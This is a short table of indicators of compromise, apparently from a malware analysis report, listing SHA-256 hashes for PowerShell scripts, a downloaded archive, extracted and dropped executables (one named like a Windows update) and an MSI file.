| `ad60d612e0a886c69b61ca742335e5f3f14c08741b083561ea0e217c061ddb30` | PowerShell Script                                                                                                               |
| `d4b9cd319e96440c9b00d5471380378db39d5dcd4106f71eb17a5721859b9692` | PowerShell Script                                                                                                               |
| `3598d0c9ef3b33192ea48347ab250bff8583270935a08044b608997eddd5732a` | PowerShell Script                                                                                                               |
| `f4153831cbc4e9ba151953454469101c047dffe689f097fa17a4619a2b1f7eec` | PowerShell Script                                                                                                               |
| `c7c36b53b6aad0828ee2c9b47e9ed588278c0cb73236319cb4c46fb2a83b7082` | Downloaded Archive (`J8QkZUVJgV.7z`)                                                                                            |
| `fb3b51251459108f3337d7ae3e5fad105d35a8956ae05d333b8f128afc451a31` | Extracted [Executable](https://app.any.run/tasks/43a11b7e-d8b9-49b4-8408-02643568f94c/) (`3e1LfPE3k6BR4EZ-ptYKZRR30rMPonL.exe`) |
| `268ae71bdcefaaa418cb42efcf0f6a3b828e233eca3cb55faa666058d9e6651b` | Dropped Executable (`update-KB4703886.exe`)                                                                                     |
| `de958b6195ea807ae674b522a907be91331c4d12e564e3a8e8d86d8db64d33cd` | MSI (`u.msi`)                                                                                                                   |
